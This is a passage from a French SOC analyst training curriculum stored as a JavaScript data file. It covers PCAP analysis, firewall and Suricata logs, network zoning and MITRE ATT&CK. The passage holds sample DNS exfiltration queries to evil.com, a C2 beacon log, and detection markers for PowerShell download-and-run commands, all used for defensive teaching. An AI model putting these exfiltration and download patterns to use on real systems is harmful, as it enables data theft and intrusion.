              "Penser que MFA = protection absolue — MFA Fatigue et AiTM contournent le MFA.",
              "Ignorer les Unified Audit Logs M365 — c'est là que se trouvent les actions post-compromission.",
              "Ne pas vérifier les règles de boîte mail après une compromission de compte."
            ],
            resume: `Azure AD Sign-in Logs = source principale. Attaques : Password Spray (50126 en masse), Impossible Travel, MFA Fatigue, Consent Phishing. Microsoft Sentinel + KQL = le SIEM cloud dominant. Après compromission : chercher les règles de boîte mail et les app consenties.`
          }
        }
      ]
    },

    // ─────────────────────────────────────────────────────────
    // MODULE 3 — RÉSEAU & ANALYSE DE TRAFIC
    // ─────────────────────────────────────────────────────────
    {
      id: "m3",
      titre: "Réseau & Analyse de Trafic",
      description: "Wireshark, firewalls, IDS/IPS — analyser le trafic réseau pour détecter les attaques.",
      icon: "🌐",
      couleur: "#06b6d4",
      mois: "Mois 3–4",
      ordre: 3,
      objectif: "Analyser des captures réseau (PCAP), écrire des règles IDS, lire des logs firewall.",
      competences: [
        {
          id: "m3c1",
          titre: "Wireshark — Analyse de trafic SOC",
          description: "Analyser des fichiers PCAP pour investiguer des incidents réseau.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c1","m1c2"],
          sous_competences: [
            "Filtres d'affichage essentiels",
            "Reconstruire un flux TCP (Follow Stream)",
            "Identifier des attaques dans un PCAP",
            "Extraire des fichiers d'une capture",
            "tcpdump — capture en ligne de commande",
            "Malware Traffic Analysis (pcap réels)"
          ],
          cours: {
            simple: `Wireshark est le microscope du réseau. En SOC, tu reçois des fichiers PCAP lors d'incidents (détection de malware, exfiltration suspecte, analyse post-incident) et tu dois y trouver les preuves rapidement. La clé : filtrer efficacement plutôt que lire paquet par paquet.

---

## Interface Wireshark — Ce qui compte

**Les 3 panneaux :**
1. **Liste des paquets** : chronologique, avec n°, timestamp, source, destination, protocole, info
2. **Détail du paquet** : décomposition couche par couche (Ethernet > IP > TCP > HTTP...)
3. **Données brutes** : hex + ASCII — utile pour voir du contenu encodé

**La barre de filtres** = ton outil n°1. Elle accepte des expressions précises pour isoler ce qui t'intéresse.

---

## Filtres de base à connaître par cœur

\`\`\`wireshark
# Filtrer par IP source ou destination
ip.src == 192.168.1.100
ip.dst == 185.220.101.42
ip.addr == 192.168.1.100    # source OU destination

# Filtrer par protocole
tcp
udp
dns
http
tls

# Filtrer par port
tcp.port == 4444
tcp.dstport == 80

# Voir uniquement les SYN (début de connexions)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Voir les réinitialisations (connexions refusées)
tcp.flags.rst == 1

# Filtres combinés
ip.src == 10.0.0.50 && tcp.dstport == 443
\`\`\`

---

## Scénarios SOC — Ce que tu cherches dans un PCAP

### Détecter un scan de ports nmap
\`\`\`wireshark
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`
**Ce que tu vois :** des dizaines de SYN vers des ports différents depuis la même IP source en quelques secondes, sans SYN-ACK en retour → port fermé ou filtré.

---

### Détecter un SYN Flood (DDoS)
\`\`\`wireshark
tcp.flags.syn == 1 && tcp.flags.ack == 0
\`\`\`
**Ce que tu vois :** des milliers de SYN vers le même port (80/443), IPs source variées ou spoofées → SYN Flood.

---

### Détecter du beacon malware
\`\`\`wireshark
http.request.method == "GET"
\`\`\`
**Ce que tu vois :** des requêtes GET régulières (toutes les 60 secondes) vers le même domaine/IP. Regarder les intervalles entre les paquets avec Statistics > IO Graph.

---

### Détecter de l'exfiltration DNS
\`\`\`wireshark
dns
\`\`\`
**Ce que tu vois :** des requêtes DNS vers des sous-domaines anormalement longs :
\`\`\`
aGVsbG8gd29ybGQgdGhpcyBpcyBleGZpbA==.evil.com
dGhpcyBpcyBhIHRlc3Q=.evil.com
\`\`\`
Les noms encodés en base64 → données exfiltrées via DNS.

---

### Détecter des credentials en clair
\`\`\`wireshark
http.request.method == "POST"
ftp
telnet
\`\`\`
**Ce que tu vois :** dans le panneau de détail → Follow TCP Stream → chercher "password=", "user=", ou des champs de formulaire.

---

## Statistics — Outils d'analyse globale

- **Statistics > Conversations** : qui parle à qui, combien de paquets, combien d'octets → identifier les flux anormaux (gros volume vers une IP inconnue)
- **Statistics > Protocol Hierarchy** : quelle proportion de chaque protocole → beaucoup de DNS = suspect
- **Statistics > IO Graph** : graphique du trafic dans le temps → pics = événement

---

## Workflow PCAP en SOC

1. **Ouvrir le PCAP**, noter la plage de temps
2. **Statistics > Conversations** → repérer les volumes anormaux
3. **Filtrer** sur les IPs suspectes identifiées
4. **Follow TCP Stream** sur les connexions suspectes → lire le contenu
5. **File > Export Objects > HTTP** → extraire les fichiers téléchargés
6. **Documenter** : IP source, IP dest, port, contenu, timestamp`,
            technique: `## Filtres Wireshark indispensables
\`\`\`
# Par IP
ip.addr == 192.168.1.50
ip.src == 10.0.0.0/8

# Par protocole
tcp.port == 4444
udp.port == 53
http
dns
smtp

# Flags TCP
tcp.flags.syn == 1 && tcp.flags.ack == 0   (SYN seul = connexion init ou scan)
tcp.flags.reset == 1                        (RST = port fermé ou reset forcé)

# Contenu
http.request.method == "POST"
dns.qry.name contains "evil"
http contains "password"

# Taille
frame.len > 1000   (gros paquets)
tcp.len == 0       (ACK purs, pas de données)
\`\`\`

## Extraire des fichiers d'un PCAP
\`\`\`
File → Export Objects → HTTP (extraire les fichiers HTTP)
File → Export Objects → SMB (extraire les fichiers SMB)
\`\`\`

## tcpdump — Capture serveur (sans GUI)
\`\`\`bash
# Capturer tout le trafic sur eth0
tcpdump -i eth0 -w /tmp/capture.pcap

# Filtrer par IP source
tcpdump -i eth0 src 185.220.x.x -w suspicious.pcap

# Filtrer par port
tcpdump -i eth0 port 4444 -w c2_traffic.pcap

# Voir en temps réel sans écrire
tcpdump -i eth0 -n -v 'dst port 53' | head -50
\`\`\``,
            attaquant: `Les attaquants utilisent Wireshark en mode MITM pour capturer des credentials. tcpdump sur un serveur compromis pour intercepter des tokens ou mots de passe circulant en clair.`,
            soc: `## Workflow analyse PCAP

1. Ouvrir le PCAP dans Wireshark
2. Statistics → Conversations → TCP : voir les pairs qui communiquent le plus
3. Statistics → Protocol Hierarchy : quels protocoles sont présents ?
4. Filtrer sur les IPs suspectes signalées dans l'alerte
5. Follow TCP Stream sur la connexion suspecte
6. Export Objects si transfert de fichiers détecté
7. Chercher des patterns : beaconing, exfil, C2`,
            logs_exemples: `## PCAP — C2 via HTTP détecté
\`\`\`
Filtre: ip.addr == 185.220.x.x && http

GET /update HTTP/1.1
Host: 185.220.x.x
User-Agent: Mozilla/5.0 (compatible)
Cookie: sessid=dGhpcyBpcyBiYXNlNjQgZW5jb2RlZCBkYXRh

HTTP/1.1 200 OK
Content-Type: text/plain
[Body en base64 → commandes C2]
\`\`\`
Cookie avec valeur base64 = canal C2 bidirectionnel via HTTP.`,
            atelier: {
              titre: "Atelier : Analyser un PCAP de malware (Malware Traffic Analysis)",
              duree: "2h",
              niveau: "intermédiaire",
              objectif: "Identifier le type de malware et extraire ses IOC depuis un PCAP réel",
              contexte: "Tu reçois un PCAP capturé sur un endpoint suspect. Tu dois identifier le malware, son C2, et les données potentiellement exfiltrées.",
              outils: ["Wireshark", "PCAP depuis malware-traffic-analysis.net (gratuits)"],
              etapes: [
                "Statistics → Protocol Hierarchy : surveiller HTTP, DNS, HTTPS inhabituel",
                "Statistics → Conversations : identifier les IPs les plus actives",
                "Filtrer sur les IPs externes inconnues",
                "Follow HTTP Stream sur les connexions suspectes",
                "Identifier le User-Agent (malware ont des UA spécifiques)",
                "Chercher les patterns beaconing (intervalles réguliers)",
                "Export Objects HTTP : récupérer les fichiers transférés",
                "SHA256 des fichiers extraits → VirusTotal"
              ],
              livrable: "IOC extraits : IP C2, domaines, hash des fichiers, User-Agent. Famille de malware identifiée."
            },
            cas_concret: `## Emotet détecté dans un PCAP

Filtre HTTP : GET requests toutes les 300 secondes vers des IPs changeantes (DGA).
Follow Stream : headers HTTP avec User-Agent Microsoft-CryptoAPI (pas un navigateur).
Export Objects : fichier .doc téléchargé depuis un serveur compromis.
Hash SHA256 → VirusTotal : Emotet dropper confirmé (62/72 AV).`,
            exercices: [
              { titre: "Malware Traffic Analysis — 5 PCAP", desc: "malware-traffic-analysis.net : analyser 5 PCAP avec les quiz fournis. Identifier famille malware, IP C2, IOC.", difficulte: "avancé", type: "lab", outil: "Wireshark, malware-traffic-analysis.net" }
            ],
            questions: [
              "Comment identifier un beaconing HTTP dans Wireshark sans connaître la période ?",
              "Quelle différence entre un filtre de capture et un filtre d'affichage dans Wireshark ?",
              "Comment extraire un fichier transféré via HTTP depuis un PCAP ?"
            ],
            niveau_recruteur: `Analyse PCAP est testée en entretien technique SOC. Avoir pratiqué sur malware-traffic-analysis.net = différenciateur. Mentionner les challenges CyberDefenders résolus.`,
            erreurs: [
              "Lire packet par packet au lieu de filtrer intelligemment.",
              "Ignorer Statistics → Conversations — c'est le point de départ optimal.",
              "Oublier de vérifier le DNS avant l'HTTP — les requêtes DNS révèlent les domaines C2."
            ],
            resume: `Filtres clés : ip.addr, tcp.port, http, dns. Workflow : Statistics → Conversations → filtrer → Follow Stream → Export Objects. tcpdump pour capturer en CLI. Chercher : beaconing, gros transferts, User-Agent suspects.`
          }
        },
        {
          id: "m3c2",
          titre: "Firewalls, IDS/IPS & Règles de détection",
          description: "Lire des logs firewall, comprendre les IDS/IPS, écrire des règles Suricata/Snort.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c1","m3c1"],
          sous_competences: [
            "Firewalls stateful : lire et interpréter les logs",
            "IDS vs IPS : Snort / Suricata",
            "Écrire une règle Suricata basique",
            "Comprendre les alertes IDS (faux positifs, vrais positifs)",
            "WAF : Web Application Firewall — logs et alertes",
            "Tuning des règles IDS"
          ],
          cours: {
            simple: `Le firewall log = ton journal des connexions autorisées et bloquées. L'IDS = le système qui analyse le contenu du trafic et déclenche des alertes sur les signatures connues. En SOC, tu lis ces logs toute la journée — savoir les interpréter rapidement est fondamental.

---

## Firewall Logs — Lire et interpréter

**Format typique d'un log firewall (iptables/UFW) :**
\`\`\`
Jan 15 09:23:41 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=185.220.101.42 DST=10.0.0.5 PROTO=TCP SPT=54321 DPT=22 SYN
\`\`\`

**Décryptage :**
- \`UFW BLOCK\` → connexion bloquée
- \`SRC=185.220.101.42\` → IP source (externe suspecte)
- \`DST=10.0.0.5\` → IP destination (serveur interne)
- \`DPT=22\` → port destination SSH
- \`SYN\` → tentative d'initiation de connexion

**Ce que ça signifie :** quelqu'un sur Internet essaie d'accéder en SSH à notre serveur. Si c'est répété = brute force.

---

**Format Palo Alto / Fortinet / pfSense (plus courant en entreprise) :**
\`\`\`
2024-01-15 09:23:41 DENY TCP 185.220.101.42:54321 → 10.0.0.5:22 [WAN→LAN] rule="Block_External_SSH" bytes=64
2024-01-15 09:24:01 ALLOW TCP 192.168.1.50:52341 → 8.8.8.8:53 [LAN→WAN] rule="Allow_DNS" bytes=128
\`\`\`

**Ce que tu cherches :**
- \`ALLOW\` vers des destinations externes inhabituelles → exfiltration possible
- \`DENY\` répétés depuis la même IP → scan ou brute force
- \`ALLOW\` sur des ports dangereux (4444, 1234, 31337) → C2 possible

---

## IDS/IPS — Snort / Suricata

**Ce que c'est :** l'IDS analyse le contenu des paquets (pas juste les headers) et compare avec des signatures d'attaques connues.

**Format d'une alerte Suricata :**
\`\`\`json
{
  "timestamp": "2024-01-15T09:45:23",
  "alert": {
    "signature": "ET MALWARE Metasploit Meterpreter Reverse Shell",
    "severity": 1,
    "category": "A Network Trojan was Detected"
  },
  "src_ip": "10.0.0.45",
  "dest_ip": "185.220.101.42",
  "dest_port": 4444,
  "proto": "TCP"
}
\`\`\`

**Décryptage :**
- Signature \`Metasploit Meterpreter\` → poste 10.0.0.45 connecté à un serveur C2 Metasploit → compromission active
- Sévérité 1 = critique
- Destination port 4444 = port par défaut Metasploit

**Ton réflexe :** isoler 10.0.0.45 immédiatement (couper du réseau), escalader, ouvrir l'EDR sur ce poste.

---

## Règles Suricata — Comment les lire

\`\`\`
alert tcp \$HOME_NET any -> \$EXTERNAL_NET 4444 (msg:"ET MALWARE Possible Metasploit C2"; sid:2024001; rev:1;)
\`\`\`

**Structure :**
- \`alert\` : action (alert, drop, reject)
- \`tcp\` : protocole
- \`\$HOME_NET any\` : source (réseau interne, n'importe quel port)
- \`-> \$EXTERNAL_NET 4444\` : destination (réseau externe, port 4444)
- \`msg\` : message d'alerte
- \`sid\` : identifiant unique de la règle

---

## Tableau de référence — Patterns à reconnaître

| Pattern dans les logs | Ce que ça signifie | Sévérité |
|----------------------|-------------------|----------|
| Blocages répétés SSH depuis même IP | Brute force SSH | Moyenne |
| ALLOW sortant vers IP récente (<30j) sur port élevé | Potentiel C2 | Haute |
| DENY entrant sur 445 depuis Internet | Scan SMB (Eternal Blue) | Haute |
| IDS : "Meterpreter" ou "Cobalt Strike" | Compromission active | Critique |
| Volume sortant anormal (Go en quelques heures) | Exfiltration | Critique |
| Connexions sur port 3389 (RDP) depuis Internet | Exposition RDP | Haute |

**Règle SOC :** un DENY ne veut pas dire que tu es safe. Si la même IP fait 1000 DENYs, elle cherche activement à entrer. Corréler avec la Threat Intelligence (AbuseIPDB, VirusTotal).`,
            technique: `## Logs Firewall — Format courant
\`\`\`
# iptables / nftables
Jan 15 14:23:01 fw01 [UFW BLOCK] IN=eth0 OUT= SRC=185.220.x.x DST=10.0.0.5
  PROTO=TCP SPT=45000 DPT=22 SYN

# Palo Alto / FortiGate (CSV/syslog)
2024-01-15 14:23:01,TRAFFIC,drop,src=185.220.x.x,dst=10.0.0.5,
  sport=45000,dport=22,proto=TCP,bytes=64,rule="Block_External_SSH"

# pfSense
Jan 15 14:23:01 filterlog: 5,,,1000000103,em0,match,block,in,4,0x0,,63,
  12345,0,DF,6,tcp,60,185.220.x.x,10.0.0.5,45000,22,0,S
\`\`\`

## Règle Suricata — Syntaxe
\`\`\`
alert tcp any any -> $HOME_NET 22 (
  msg:"SSH Brute Force Attempt";
  flow:to_server;
  threshold:type threshold, track by_src, count 5, seconds 60;
  classtype:attempted-user;
  sid:1000001;
  rev:1;
)
\`\`\`

\`\`\`
alert http any any -> any any (
  msg:"Possible SQL Injection - UNION SELECT";
  content:"UNION"; nocase;
  content:"SELECT"; nocase; distance:0;
  http.uri;
  classtype:web-application-attack;
  sid:1000002;
  rev:1;
)
\`\`\``,
            attaquant: `Les attaquants évitent les règles IDS en fragmentant les paquets, encodant les payloads (URL encoding, base64), utilisant des protocoles chiffrés (TLS sur le port 443), et en imitant du trafic légitime.`,
            soc: `## Qualifier une alerte IDS

\`\`\`
Alerte : "ET MALWARE Emotet CnC Beacon"
Source: 192.168.1.80:54321 → 185.220.x.x:80

Questions à se poser :
1. L'IP source est-elle dans notre réseau ?  → OUI = endpoint infecté
2. L'IP destination est-elle connue malveillante ?  → VirusTotal / AbuseIPDB
3. C'est une règle "ET MALWARE" → haute fidélité, probablement vrai positif
4. D'autres endpoints contactent la même IP ?
5. Sysmon Event 3 confirme-t-il la connexion depuis le même PID ?
\`\`\``,
            logs_exemples: `## Suricata alert log
\`\`\`json
{
  "timestamp": "2024-01-15T14:23:01",
  "event_type": "alert",
  "src_ip": "192.168.1.80",
  "dest_ip": "185.220.x.x",
  "dest_port": 80,
  "proto": "TCP",
  "alert": {
    "signature": "ET MALWARE Possible Emotet CnC Beacon",
    "category": "A Network Trojan was Detected",
    "severity": 1
  },
  "http": {
    "url": "/update",
    "user_agent": "Mozilla/4.0 (compatible; MSIE 7.0)"
  }
}
\`\`\`
Severity 1 = plus haute priorité. User-Agent IE7 en 2024 = malware.`,
            atelier: {
              titre: "Atelier : Écrire et tester une règle Suricata",
              duree: "1h30",
              niveau: "intermédiaire",
              objectif: "Créer une règle Suricata qui détecte un scan de ports et tester son efficacité",
              contexte: "Ton SOC reçoit trop d'alertes de scan. Tu dois créer une règle précise qui détecte les scans nmap agressifs sans générer trop de faux positifs.",
              outils: ["Suricata (VM Linux)", "nmap", "Wireshark"],
              etapes: [
                "Installer Suricata sur une VM Linux",
                "Lancer un nmap -sS depuis Kali vers la VM",
                "Observer les paquets dans Wireshark : SYN vers ports variés",
                "Écrire une règle Suricata : threshold de SYN > 10 ports en 5 secondes",
                "Tester la règle : sudo suricata -T -c /etc/suricata/suricata.yaml",
                "Relancer nmap et vérifier /var/log/suricata/fast.log",
                "Ajuster le threshold pour réduire les faux positifs"
              ],
              livrable: "Règle Suricata fonctionnelle avec documentation (pourquoi ce threshold, cas de faux positif identifiés)."
            },
            cas_concret: `## Alerte IDS → investigation complète

Alerte Suricata : "ET SCAN Nmap Scripting Engine User-Agent"
Source : 10.10.5.50 → toute la DMZ

Actions :
1. 10.10.5.50 = poste de l'équipe IT → scan autorisé ou non ?
2. Check dans le CMDB / Change Management : aucun scan planifié
3. Isoler 10.10.5.50 en quarantaine
4. Investigation : qui s'est connecté sur ce poste récemment ? (Event 4624)
5. Résultat : compte de service compromis, nmap lancé depuis un script PowerShell
6. Alerte escaladée en P2`,
            exercices: [
              { titre: "Analyser 10 alertes IDS", desc: "Jeu de logs Suricata fourni : 10 alertes. Pour chaque : classifier vrai positif/faux positif, justifier, action recommandée.", difficulte: "moyen", type: "analyse" }
            ],
            questions: [
              "Quelle est la différence entre un IDS et un IPS en termes d'action ?",
              "Comment réduire les faux positifs d'une règle IDS sans la désactiver ?",
              "Un WAF bloque une requête avec 'UNION SELECT'. Étapes d'investigation ?"
            ],
            niveau_recruteur: `Lire des logs firewall et des alertes IDS = compétence quotidienne L1. Savoir écrire une règle Suricata simple est un plus valorisé.`,
            erreurs: [
              "Traiter toutes les alertes IDS comme des vrais positifs — un IDS bien configuré génère 30-50% de faux positifs.",
              "Bloquer une IP sur la base d'une seule alerte IDS sans enrichissement.",
              "Ignorer la sévérité des règles Suricata — severity 1 ≠ severity 3."
            ],
            resume: `Firewall logs : SOURCE → DEST + PORT + ACTION. IDS : alerte + signature + sévérité. Règle Suricata : alert + condition + threshold + sid. Toujours enrichir (VirusTotal, AbuseIPDB) avant de conclure sur une alerte IDS.`
          }
        },
        {
          id: "m3c3",
          titre: "Architecture réseau sécurisée",
          description: "VLAN, DMZ, segmentation, zero trust — comprendre l'architecture pour défendre.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c1"],
          sous_competences: [
            "VLAN et segmentation réseau",
            "DMZ et zones de sécurité",
            "Zero Trust Architecture",
            "NAT et PAT",
            "Proxy et filtrage web",
            "Architecture SOC : collecte de logs"
          ],
          cours: {
            simple: `En SOC, tu dois comprendre l'architecture du réseau que tu défends. Où sont les serveurs critiques ? Quelles zones peuvent communiquer entre elles ? Cette connaissance te permet de qualifier en 10 secondes si une connexion est normale ou suspecte.

---

## Les zones réseau — Concept fondamental

**Ce que c'est :** les réseaux d'entreprise sont découpés en zones avec des niveaux de confiance différents, séparées par des firewalls.

| Zone | Contenu typique | Niveau de confiance | Accès depuis Internet |
|------|----------------|--------------------|-----------------------|
| **Internet** | Tout | 0 (aucune confiance) | N/A |
| **DMZ** | Serveurs web, mail, VPN | Faible | Oui (contrôlé) |
| **LAN utilisateurs** | Postes de travail | Moyen | Non |
| **LAN serveurs** | Serveurs internes | Haut | Non |
| **OT/SCADA** | Systèmes industriels | Très haut | Jamais |
| **Management** | Switches, routeurs, DC | Critique | Jamais |

---

## La DMZ — Ce que le SOC doit surveiller

**Ce que c'est :** zone tampon entre Internet et le réseau interne. Les serveurs en DMZ sont exposés à Internet — ils sont donc les premiers à être attaqués.

**Ce que tu vois en logs si la DMZ est compromise :**
- Connexion depuis la DMZ vers le LAN interne (pas normale) → mouvement latéral potentiel
- Nouveau process sur le serveur web en DMZ → web shell déposé
- Connexion sortante de la DMZ vers une IP externe inconnue → C2 depuis serveur compromis

**Ton réflexe :** tout trafic DMZ → LAN interne non prévu = escalade immédiate.

---

## VLANs — Segmentation du réseau interne

**Ce que c'est :** les VLANs (Virtual LANs) segmentent le réseau interne pour limiter la propagation d'une compromission.

**Exemple de segmentation typique :**
\`\`\`
VLAN 10 — Utilisateurs (192.168.10.0/24)
VLAN 20 — Serveurs (192.168.20.0/24)
VLAN 30 — DMZ (192.168.30.0/24)
VLAN 40 — Management (10.0.40.0/24)
VLAN 50 — IoT (192.168.50.0/24)
\`\`\`

**Ce que tu cherches en SOC :**
- Un poste du VLAN 10 qui communique directement avec le VLAN 40 (management) → inter-VLAN suspect
- Un device IoT (VLAN 50) qui fait des requêtes DNS vers Internet en gros volume → compromis

---

## Flux réseau légitimes vs suspects

**Ce qui est normal :**
\`\`\`
Utilisateur (VLAN 10) → Proxy (DMZ) → Internet         ✓ Navigation web
Utilisateur (VLAN 10) → DC (VLAN 20) port 389/636      ✓ Authentification AD
Serveur (VLAN 20) → Internet port 443                   ✓ Mises à jour
\`\`\`

**Ce qui est suspect :**
\`\`\`
Poste utilisateur → autre poste utilisateur port 445    ⚠ Lateral movement SMB
DMZ → LAN interne port 3389                             🚨 Pivot depuis DMZ
Serveur BDD → Internet port 4444                        🚨 C2 depuis serveur compromis
IoT → DC port 88 (Kerberos)                             🚨 Attaque depuis IoT
\`\`\`

---

## Lire un schéma réseau comme un SOC analyst

Quand tu arrives dans un SOC, demande ou cherche :
1. **Le schéma réseau** (network diagram) → quelles IP/subnets correspondent à quelles zones
2. **La matrice des flux autorisés** → quels flows sont légitimes
3. **La liste des serveurs critiques** (DC, serveurs de fichiers, ERP) → toute connexion anormale vers eux = priorité haute
4. **Les accès VPN** → depuis quelles IP, quels utilisateurs

**Tableau de référence à avoir sous la main :**

| Flux observé | Normal ? | Action |
|-------------|----------|--------|
| Interne → DC port 88/389 | Oui | Rien |
| Externe → port 22/3389 | Non | Alerter |
| Poste → poste port 445 | Suspect | Investiguer |
| Serveur web → IP externe aléatoire | Non | Isoler + escalader |
| Interne → proxy → Internet | Oui (si proxy connu) | Rien |`,
            technique: `## Zones de sécurité typiques

\`\`\`
Internet
    ↓
[Firewall externe]
    ↓
DMZ (serveurs exposés : web, mail, VPN)
    ↓
[Firewall interne]
    ↓
LAN Utilisateurs (VLAN 10 : bureau, VLAN 20 : impression…)
    ↓
[Firewall serveurs]
    ↓
VLAN Serveurs (VLAN 100 : appli, VLAN 110 : BDD)
    ↓
VLAN Management (accès admin seulement)
\`\`\`

**Règle SOC :** Un serveur de BDD (VLAN 110) ne devrait JAMAIS initier une connexion vers Internet. Si c'est le cas → alerte critique (exfiltration ou compromission).

## Zero Trust — Principe clé
"Ne jamais faire confiance, toujours vérifier." Même en interne, chaque accès est authentifié et autorisé. Impact SOC : plus de logs, plus d'alertes → meilleure visibilité.`,
            attaquant: `Mouvement latéral : après avoir compromis un poste (VLAN Users), l'attaquant pivote vers les serveurs (VLAN Servers). Détection : connexions inhabituelles entre VLANs normalement cloisonnés.`,
            soc: `## Détecter le mouvement latéral

Connexion du VLAN Users vers VLAN Servers sur le port 445 (SMB) ou 3389 (RDP) = suspect si ce n'est pas un admin IT identifié. Firewall logs inter-VLAN = source de détection du mouvement latéral.`,
            logs_exemples: `## Firewall inter-VLAN — Mouvement latéral
\`\`\`
ALLOW VLAN10→VLAN100 TCP 192.168.10.55:49234 → 10.100.0.5:445 (SMB)
ALLOW VLAN10→VLAN100 TCP 192.168.10.55:49235 → 10.100.0.8:445 (SMB)
ALLOW VLAN10→VLAN100 TCP 192.168.10.55:49236 → 10.100.0.12:3389 (RDP)
\`\`\`
Poste utilisateur scannant les serveurs via SMB/RDP = mouvement latéral probable.`,
            atelier: { titre: "Atelier : Cartographier l'architecture réseau d'un incident", duree: "1h", niveau: "intermédiaire", objectif: "À partir des logs firewall, reconstruire le chemin de l'attaquant à travers le réseau", contexte: "Incident confirmé : poste WKS-042 compromis. L'attaquant a-t-il pivoté vers les serveurs ?", outils: ["Logs firewall fournis", "draw.io ou papier"], etapes: ["Extraire toutes les connexions initiées par WKS-042 dans les 24h", "Identifier les destinations : VLANs, ports", "Mapper sur un schéma réseau", "Identifier les serveurs potentiellement atteints", "Prioriser les serveurs à investiguer"], livrable: "Schéma du chemin d'attaque + liste des systèmes potentiellement compromis." },
            cas_concret: `## Pivot détecté depuis un poste utilisateur
Alerte : WKS-042 (VLAN Users) contacte srv-dc01 (VLAN Servers) sur le port 445.
Normalement : seuls les DC et serveurs de fichiers utilisent SMB inter-VLAN.
Investigation : WKS-042 compromis depuis 2h, attaquant utilise SMB pour se déplacer vers le DC.
Action : isoler WKS-042, analyser srv-dc01 pour détecter si l'attaquant a réussi à s'y connecter.`,
            exercices: [{ titre: "Détecter le mouvement latéral dans des logs firewall", desc: "Jeu de logs firewall inter-VLAN : identifier les connexions inhabituelles qui indiquent un pivot.", difficulte: "moyen", type: "analyse" }],
            questions: ["Pourquoi un serveur de base de données ne devrait-il jamais initier des connexions vers Internet ?", "Comment le principe Zero Trust change-t-il la surface d'attaque ?"],
            niveau_recruteur: `Comprendre l'architecture réseau permet de qualifier rapidement une alerte. Un analyste qui comprend les zones de sécurité est plus efficace dans le triage.`,
            erreurs: ["Traiter une connexion DMZ→LAN comme normale — c'est toujours suspect.", "Ignorer les logs firewall inter-VLAN — c'est là que se voit le mouvement latéral."],
            resume: `DMZ = zone exposée. LAN segmenté en VLANs. Connexion inhabituelle entre VLANs = mouvement latéral. DB → Internet = exfiltration probable. Zero Trust = vérifier chaque accès même interne.`
          }
        }
      ]
    },

    // ─────────────────────────────────────────────────────────
    // MODULE 4 — CYBERSÉCURITÉ & MENACES
    // ─────────────────────────────────────────────────────────
    {
      id: "m4",
      titre: "Cybersécurité & Menaces",
      description: "Paysage des menaces, MITRE ATT&CK, triage d'alertes, EDR — le cœur opérationnel du SOC.",
      icon: "🛡",
      couleur: "#ef4444",
      mois: "Mois 4–6",
      ordre: 4,
      objectif: "Utiliser MITRE ATT&CK pour contextualiser les alertes. Triager avec un EDR. Comprendre les menaces pour mieux les détecter.",
      competences: [
        {
          id: "m4c1",
          titre: "MITRE ATT&CK — Usage terrain SOC",
          description: "Utiliser le framework MITRE ATT&CK au quotidien pour contextualiser les alertes.",
          duree: "1 semaine",
          difficulte: "intermédiaire",
          prerequis: ["m1c3","m2c1"],
          sous_competences: [
            "Structure ATT&CK : Tactics, Techniques, Sub-techniques",
            "Navigator — cartographier une attaque",
            "Mapper une alerte sur ATT&CK",
            "Kill Chain Lockheed Martin vs ATT&CK",
            "ATT&CK dans les règles SIEM (tags)",
            "Utiliser ATT&CK pour le threat hunting"
          ],
          cours: {
            simple: `MITRE ATT&CK est le dictionnaire des techniques d'attaque utilisées par les vrais groupes malveillants. En SOC, tu l'utilises pour : comprendre ce que l'attaquant est en train de faire, estimer la sévérité, anticiper la suite, et améliorer tes détections.

---

## Structure du framework

**Tactiques** (le "pourquoi") → **Techniques** (le "comment") → **Sous-techniques** (le "comment exactement")

**Les 14 tactiques dans l'ordre d'une attaque :**

| # | Tactique | Ce qui se passe |
|---|----------|----------------|
| 1 | **Reconnaissance** | L'attaquant collecte des infos (LinkedIn, Shodan, WHOIS) |
| 2 | **Resource Development** | Il prépare son infrastructure (domaines, serveurs C2) |
| 3 | **Initial Access** | Il entre dans le réseau (phishing, exploit public, credentials volés) |
| 4 | **Execution** | Il exécute son code (PowerShell, macro Office, script) |
| 5 | **Persistence** | Il s'assure de pouvoir revenir (tâche planifiée, registre, backdoor) |
| 6 | **Privilege Escalation** | Il monte en droits (Local Admin → Domain Admin) |
| 7 | **Defense Evasion** | Il se cache (désactiver AV, log tampering, obfuscation) |
| 8 | **Credential Access** | Il vole des identifiants (Mimikatz, Kerberoasting) |
| 9 | **Discovery** | Il cartographie le réseau (BloodHound, nmap interne) |
| 10 | **Lateral Movement** | Il se déplace (PtH, RDP, WMI) |
| 11 | **Collection** | Il rassemble les données cibles |
| 12 | **Command & Control** | Il maintient un canal avec son serveur (C2 HTTP/DNS/HTTPS) |
| 13 | **Exfiltration** | Il extrait les données (FTP, DNS tunneling, cloud storage) |
| 14 | **Impact** | Il frappe (ransomware, wiper, sabotage) |

---

## Techniques clés à reconnaître en SOC L1

### T1059.001 — PowerShell (Execution)
**Ce que tu vois :** Event 4104 ou Sysmon Event 1 avec un parent Word/Excel qui lance powershell.exe
**Signaux :** \`-EncodedCommand\`, \`-WindowStyle Hidden\`, \`IEX\`, \`DownloadString\`

### T1053.005 — Scheduled Task (Persistence)
**Ce que tu vois :** Event 4698 — nouvelle tâche planifiée créée
**Signaux :** tâche qui exécute un script dans \`%TEMP%\` ou \`%APPDATA%\`

### T1078 — Valid Accounts (Initial Access / Lateral Movement)
**Ce que tu vois :** connexion réussie avec des credentials légitimes mais depuis une IP/heure inhabituelles
**Signaux :** Event 4624 LogonType 3 depuis une nouvelle IP

### T1003.001 — LSASS Memory (Credential Access)
**Ce que tu vois :** accès au process lsass.exe par un process inattendu (Mimikatz)
**Signaux :** Sysmon Event 10 (ProcessAccess) sur lsass.exe depuis powershell.exe

### T1071.001 — Web Protocols (C2)
**Ce que tu vois :** requêtes HTTP/HTTPS régulières vers un domaine inconnu
**Signaux :** User-Agent générique, beacon toutes les X secondes

---

## Comment utiliser ATT&CK en pratique

**Scénario :** tu reçois une alerte "PowerShell avec encodedCommand depuis Word.exe"

1. **Identifier la technique :** T1059.001 (PowerShell) sous tactique "Execution"
2. **Chercher les techniques précédentes probables** : Initial Access → T1566 (Phishing) car Word a lancé PowerShell → probable macro malveillante dans un email
3. **Anticiper la suite** : après Execution → Persistence (T1053 tâche planifiée ?) → Credential Access (T1003 Mimikatz ?) → Lateral Movement
4. **Vérifier** dans le SIEM et l'EDR les techniques probables suivantes

**Lien utile :** attack.mitre.org → saisir le nom de la technique ou le T-code pour voir la description complète, les outils utilisés, et les détections recommandées.

---

